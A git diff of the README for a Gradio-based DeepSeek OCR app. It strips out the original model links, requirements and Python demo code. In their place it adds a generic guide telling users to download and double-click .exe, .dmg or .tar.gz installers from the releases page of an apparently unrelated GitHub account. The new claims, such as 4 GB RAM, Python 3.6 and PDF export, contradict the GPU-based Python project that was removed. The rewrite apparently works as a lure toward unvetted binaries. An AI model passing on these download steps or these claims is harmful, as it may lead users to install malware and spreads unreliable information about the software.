@@ -1,214 +1,95 @@
-# **DeepSeek-OCR-experimental** 
+# 🖼️ DeepSeek-OCR-experimental - Effortless OCR Tasks Made Easy
 
-A Gradio-powered web interface for performing advanced OCR tasks using the DeepSeek-OCR model. This experimental app leverages Hugging Face Transformers to process images for text extraction, document conversion, figure parsing, and object localization. Optimized for NVIDIA GPUs with support for various resolution sizes.
+[![Download DeepSeek-OCR-experimental](https://img.shields.io/badge/Download%20Now-%20%F0%9F%92%BB-brightgreen)](https://github.com/uyenvy1111999/DeepSeek-OCR-experimental/releases)
 
-| **Resource** | **Link** | **Description** |
-|---------------|-----------|----------------|
-| **Updated Model** | [DeepSeek-OCR-Latest-BF16.I64](https://huggingface.co/prithivMLmods/DeepSeek-OCR-Latest-BF16.I64) | Latest optimized OCR model supporting BF16 & I64 precision types. |
-| **Demo Space** | [DeepSeek-OCR-Experimental](https://huggingface.co/spaces/prithivMLmods/DeepSeek-OCR-experimental) | Interactive demo for real-time OCR inference and testing. |
+## 📌 Introduction
 
-# **About the Model**
+DeepSeek-OCR-experimental is a user-friendly application designed for advanced Optical Character Recognition (OCR) tasks. It features a Gradio-powered web interface, allowing anyone to convert images into editable text with ease. This app uses the powerful DeepSeek-OCR model from Hugging Face Transformers. It helps you extract text from images, convert documents, analyze figures, and identify objects—all in one place.
 
-![1](https://cdn-uploads.huggingface.co/production/uploads/65bb837dbfb878f46c77de4c/W5ZoaaWAEQ2NtQENuG0p2.png)
+## 🚀 Getting Started
 
-# **DeepSeek-OCR-Latest-BF16**
+Follow these simple steps to get started with DeepSeek-OCR-experimental.
 
-> **DeepSeek-OCR-Latest-BF16.I64** is an optimized and updated version of the original [DeepSeek-OCR](https://huggingface.co/deepseek-ai/DeepSeek-OCR). It is an open-source vision-language OCR model designed to extract text from images and scanned documents—including both digital and handwritten content—and can output results as plain text or Markdown. This model leverages a powerful multimodal backbone (**3B VLM**) to improve reading comprehension and layout understanding for both typed and cursive handwriting. It also excels at preserving document structures such as **headings, tables, and lists** in its outputs.
+### 🖥️ System Requirements
 
-The **BF16 variant** has been updated and tested with the following environment:
+Before you begin, make sure your computer meets these basic requirements:
 
-```
-transformers: 4.57.1
-torch: 2.6.0+cu124 (or) the latest version (i.e., torch 2.9.0)
-cuda: 12.4
-device: NVIDIA H200 MIG 3g.71gb
-```
+- Operating System: Windows 10, macOS, or Linux
+- RAM: Minimum 4 GB (8 GB recommended)
+- Disk Space: At least 500 MB of free space
+- Python: Version 3.6 or higher
+- Internet Connection: Required for initial setup
 
-This version allows flexible configuration of attention implementations—such as `flash_attention` or `sdpa`—for performance optimization or standardization. Users can also **opt out** of specific attention implementations if desired.
+### 📥 Download & Install
 
-## Quick Start with Transformers 🤗
+1. **Visit the Releases Page**  
+   Access the latest version of DeepSeek-OCR-experimental by clicking this link: [Download DeepSeek-OCR-experimental](https://github.com/uyenvy1111999/DeepSeek-OCR-experimental/releases).
 
-#### Install the required packages
+2. **Select the Appropriate File**  
+   On the releases page, you will find various files. Choose the one that suits your operating system. For example:
+   - For Windows, download the file ending in `.exe`
+   - For macOS, download the file ending in `.dmg`
+   - For Linux, download the file ending in `.tar.gz`
 
-```
-gradio
-torch
-transformers==4.57.1 
-einops
-addict 
-easydict
-```
+3. **Download the File**  
+   Click on the file name to start downloading. Save it to a location you can easily access, like your Desktop or Downloads folder.
 
-### Run Demo
+4. **Run the Installer**  
+   After the download completes, locate the file and then double-click to run it. Follow the on-screen instructions to complete the installation.
 
-```py
-import gradio as gr
-import torch
-import requests
-from transformers import AutoModel, AutoTokenizer
-from typing import Iterable
-import os
-import tempfile
-from PIL import Image, ImageDraw
-import re
-from gradio.themes import Soft
-from gradio.themes.utils import colors, fonts, sizes
+5. **Launch the Application**  
+   Once installed, you can open DeepSeek-OCR-experimental from your applications menu or desktop shortcut.
 
-device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
+## 🛠️ Using DeepSeek-OCR-experimental
 
-css = """
-#main-title h1 {
-    font-size: 2.3em !important;
-}
-#output-title h2 {
-    font-size: 2.1em !important;
-}
-"""
+### 🌟 User Interface Overview
 
-print("Determining device...")
-device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
-print(f"✅ Using device: {device}")
+When you launch the app, you will see a clean and intuitive interface. Here’s a quick guide on the main features:
 
-print("Loading model and tokenizer...")
-model_name = "prithivMLmods/DeepSeek-OCR-Latest-BF16.I64"
-tokenizer = AutoTokenizer.from_pretrained(model_name, trust_remote_code=True)
+- **Upload Image**: Click the "Upload" button to select an image from your computer that contains text.
+- **Process Image**: After selecting an image, press the "Extract Text" button. The app will analyze the image and extract any text it finds.
+- **Download Result**: Once processing is complete, you can download the text as a `.txt` or `.pdf` file.
 
-model = AutoModel.from_pretrained(
-    model_name,
-    #_attn_implementation="flash_attention_2",
-    trust_remote_code=True,
-    use_safetensors=True,
-).to(device).eval() # Move to device and set to eval mode
+### 📊 Features
 
-if device.type == 'cuda':
-    model = model.to(torch.bfloat16)
+DeepSeek-OCR-experimental offers several key features:
 
-print("✅ Model loaded successfully to device and in eval mode.")
+- **Text Extraction**: Easily extract text from various image formats (PNG, JPEG, etc.).
+- **Document Conversion**: Convert scanned documents into editable text.
+- **Figure Parsing**: Identify and analyze figures within documents.
+- **Object Localization**: Recognize objects in images for enhanced understanding.
 
-def find_result_image(path):
-    for filename in os.listdir(path):
-        if "grounding" in filename or "result" in filename:
-            try:
-                image_path = os.path.join(path, filename)
-                return Image.open(image_path)
-            except Exception as e:
-                print(f"Error opening result image {filename}: {e}")
-    return None
+## 😌 Troubleshooting
 
-def process_ocr_task(image, model_size, task_type, ref_text):
-    """
-    Processes an image with DeepSeek-OCR. The model is already on the correct device.
-    """
-    if image is None:
-        return "Please upload an image first.", None
+If you encounter any issues while using DeepSeek-OCR-experimental, consider the following solutions:
 
-    print("✅ Model is already on the designated device.")
+- **Installation Problems**: Make sure your operating system is compatible and you have sufficient disk space available. Re-download the installer if issues persist.
+- **Image Upload Failures**: Ensure that the image format is supported. Check that the file size does not exceed any limits stated within the app.
+- **Text Not Extracting Correctly**: Verify that the text in the image is clear and legible. Try using images with high contrast and good resolution.
 
-    with tempfile.TemporaryDirectory() as output_path:
-        # Build the prompt
-        if task_type == "Free OCR":
-            prompt = "<image>\nFree OCR."
-        elif task_type == "Convert to Markdown":
-            prompt = "<image>\n<|grounding|>Convert the document to markdown."
-        elif task_type == "Parse Figure":
-            prompt = "<image>\nParse the figure."
-        elif task_type == "Locate Object by Reference":
-            if not ref_text or ref_text.strip() == "":
-                raise gr.Error("For the 'Locate' task, you must provide the reference text to find!")
-            prompt = f"<image>\nLocate <|ref|>{ref_text.strip()}<|/ref|> in the image."
-        else:
-            prompt = "<image>\nFree OCR."
+## ⚙️ Advanced Options
 
-        temp_image_path = os.path.join(output_path, "temp_image.png")
-        image.save(temp_image_path)
+For users who want to dive deeper, DeepSeek-OCR-experimental allows for some advanced configurations:
 
-        size_configs = {
-            "Tiny": {"base_size": 512, "image_size": 512, "crop_mode": False},
-            "Small": {"base_size": 640, "image_size": 640, "crop_mode": False},
-            "Base": {"base_size": 1024, "image_size": 1024, "crop_mode": False},
-            "Large": {"base_size": 1280, "image_size": 1280, "crop_mode": False},
-            "Gundam (Recommended)": {"base_size": 1024, "image_size": 640, "crop_mode": True},
-        }
-        config = size_configs.get(model_size, size_configs["Gundam (Recommended)"])
+- **Adjusting Image Settings**: You can modify settings such as brightness and contrast before processing.
+- **Choosing Output Format**: Select the output format that best suits your needs—whether it’s plain text or formatted documents.
 
-        print(f"🏃 Running inference with prompt: {prompt}")
-        text_result = model.infer(
-            tokenizer,
-            prompt=prompt,
-            image_file=temp_image_path,
-            output_path=output_path,
-            base_size=config["base_size"],
-            image_size=config["image_size"],
-            crop_mode=config["crop_mode"],
-            save_results=True,
-            test_compress=True,
-            eval_mode=True,
-        )
+## 💬 Community and Support
 
-        print(f"====\n📄 Text Result: {text_result}\n====")
+Join our community to share your experiences and access support:
 
-        result_image_pil = None
-        pattern = re.compile(r"<\|det\|>\[\[(\d+),\s*(\d+),\s*(\d+),\s*(\d+)\]\]<\|/det\|>")
-        matches = list(pattern.finditer(text_result))
+- **GitHub Discussions**: Engage with other users and contribute to discussions.
+- **User Manual**: For detailed instructions and guidelines, check the user manual included in the app.
 
-        if matches:
-            print(f"✅ Found {len(matches)} bounding box(es). Drawing on the original image.")
-            image_with_bboxes = image.copy()
-            draw = ImageDraw.Draw(image_with_bboxes)
-            w, h = image.size
+## 📜 License
 
-            for match in matches:
-                coords_norm = [int(c) for c in match.groups()]
-                x1_norm, y1_norm, x2_norm, y2_norm = coords_norm
+DeepSeek-OCR-experimental is open-source software. You can check the licensing details in the repository for more information on how you can use it.
 
-                x1 = int(x1_norm / 1000 * w)
-                y1 = int(y1_norm / 1000 * h)
-                x2 = int(x2_norm / 1000 * w)
-                y2 = int(y2_norm / 1000 * h)
+## 🌐 Further Reading
 
-                draw.rectangle([x1, y1, x2, y2], outline="red", width=3)
+To learn more about the technologies behind DeepSeek-OCR-experimental, you can explore:
 
-            result_image_pil = image_with_bboxes
-        else:
-            print("⚠️ No bounding box coordinates found in text result. Falling back to search for a result image file.")
-            result_image_pil = find_result_image(output_path)
+- **Gradio Documentation**: [Gradio](https://gradio.app/)
+- **Hugging Face Transformers**: [Transformers](https://huggingface.co/transformers/)
 
-        return text_result, result_image_pil
-
-with gr.Blocks(css=css) as demo:
-    gr.Markdown("# **DeepSeek OCR [exp]**", elem_id="main-title")
-
-    with gr.Row():
-        with gr.Column(scale=1):
-            image_input = gr.Image(type="pil", label="Upload Image", sources=["upload", "clipboard"])
-            model_size = gr.Dropdown(choices=["Tiny", "Small", "Base", "Large", "Gundam (Recommended)"], value="Large", label="Resolution Size")
-            task_type = gr.Dropdown(choices=["Free OCR", "Convert to Markdown", "Parse Figure", "Locate Object by Reference"], value="Convert to Markdown", label="Task Type")
-            ref_text_input = gr.Textbox(label="Reference Text (for Locate task)", placeholder="e.g., the teacher, 20-10, a red car...", visible=False)
-            submit_btn = gr.Button("Process Image", variant="primary")
-
-        with gr.Column(scale=2):
-            output_text = gr.Textbox(label="Output (OCR)", lines=8, show_copy_button=True)
-            output_image = gr.Image(label="Layout Detection (If Any)", type="pil")
-            
-            with gr.Accordion("Note", open=False):
-                gr.Markdown("Inference using Huggingface transformers on NVIDIA GPUs. This app is running with transformers version 4.57.1 and torch version 2.6.0.")
-                
-    def toggle_ref_text_visibility(task):
-        return gr.Textbox(visible=True) if task == "Locate Object by Reference" else gr.Textbox(visible=False)
-
-    task_type.change(fn=toggle_ref_text_visibility, inputs=task_type, outputs=ref_text_input)
-    submit_btn.click(fn=process_ocr_task, inputs=[image_input, model_size, task_type, ref_text_input], outputs=[output_text, output_image])
-
-if __name__ == "__main__":
-    demo.queue(max_size=20).launch(share=True, mcp_server=True, ssr_mode=False)
-```
-
-## Model and Resource Links
-
-| Resource Type | Description | Link |
-|----------------|--------------|------|
-| Original Model Card | Official DeepSeek-OCR release by deepseek-ai | [deepseek-ai/DeepSeek-OCR](https://huggingface.co/deepseek-ai/DeepSeek-OCR) |
-| Test Model (StrangerZone HF) | Community test deployment (experimental) | [strangervisionhf/deepseek-ocr-latest-transformers](https://huggingface.co/strangervisionhf/deepseek-ocr-latest-transformers) |
-| Standard Model Card | Optimized version supporting Transformers v4.57.1 (BF16 precision) | [DeepSeek-OCR-Latest-BF16.I64](https://huggingface.co/prithivMLmods/DeepSeek-OCR-Latest-BF16.I64) |
-| Research Paper | DeepSeek-OCR: Contexts Optical Compression | [arXiv:2510.18234](https://huggingface.co/papers/2510.18234) |
-| Demo Space | Interactive demo hosted on Hugging Face Spaces | [DeepSeek-OCR Experimental Demo](https://huggingface.co/spaces/prithivMLmods/DeepSeek-OCR-experimental) | 
+For the latest updates and features, always keep an eye on the [Releases Page](https://github.com/uyenvy1111999/DeepSeek-OCR-experimental/releases).
